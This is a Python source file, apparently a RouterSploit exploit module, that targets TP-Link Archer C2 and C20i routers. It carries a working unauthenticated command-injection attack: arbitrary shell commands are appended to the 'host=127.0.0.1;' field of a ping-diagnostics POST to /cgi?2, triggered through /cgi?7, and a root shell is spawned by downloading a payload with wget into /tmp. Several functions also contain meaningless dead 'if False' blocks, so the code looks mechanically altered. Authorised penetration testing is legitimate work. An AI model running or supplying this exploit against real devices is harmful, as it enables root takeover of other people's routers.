import time
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'TP-Link Archer C2 & C20i', 'description': 'Exploits TP-Link Archer C2 and Archer C20i remote code execution vulnerability that allows executing commands on operating system level with root privileges.', 'authors': ('Michal Sajdak <michal.sajdak[at]securitum.pl', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('http://sekurak.pl/tp-link-root-bez-uwierzytelnienia-urzadzenia-archer-c20i-oraz-c2/',), 'devices': ('TP-Link Archer C2', 'TP-Link Archer C20i')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')

    def run(self):
        if False:
            while True:
                i = 10
        if self.check():
            print_success('Target is vulnerable')
            print_status('Invoking command shell')
            print_status('It is blind command injection so response is not available')
            shell(self, architecture='mipsbe', method='wget', location='/tmp')
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    def execute(self, cmd):
        if False:
            return 10
        referer = '{}/mainFrame.htm'.format(self.target)
        headers = {'Content-Type': 'text/plain', 'Referer': referer}
        data = '[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\ndataBlockSize=64\r\ntimeout=1\r\nnumberOfRepetitions=1\r\nhost=127.0.0.1;' + cmd + ';\r\nX_TP_ConnName=ewan_ipoe_s\r\ndiagnosticsState=Requested\r\n'
        self.http_request(method='POST', path='/cgi?2', headers=headers, data=data)
        data = '[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n'
        self.http_request(method='POST', path='/cgi?7', headers=headers, data=data)
        time.sleep(1)
        return ''

    @mute
    def check(self):
        if False:
            i = 10
            return i + 15
        referer = self.get_target_url(path='/mainFrame.htm')
        headers = {'Content-Type': 'text/plain', 'Referer': referer}
        data = '[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\ndataBlockSize=64\r\ntimeout=1\r\nnumberOfRepetitions=1\r\nhost=127.0.0.1\r\nX_TP_ConnName=ewan_ipoe_s\r\ndiagnosticsState=Requested\r\n'
        response = self.http_request(method='POST', path='/cgi?2', headers=headers, data=data)
        if response is None:
            return False
        if response.status_code == 200 and '[error]0' in response.text:
            return True
        return False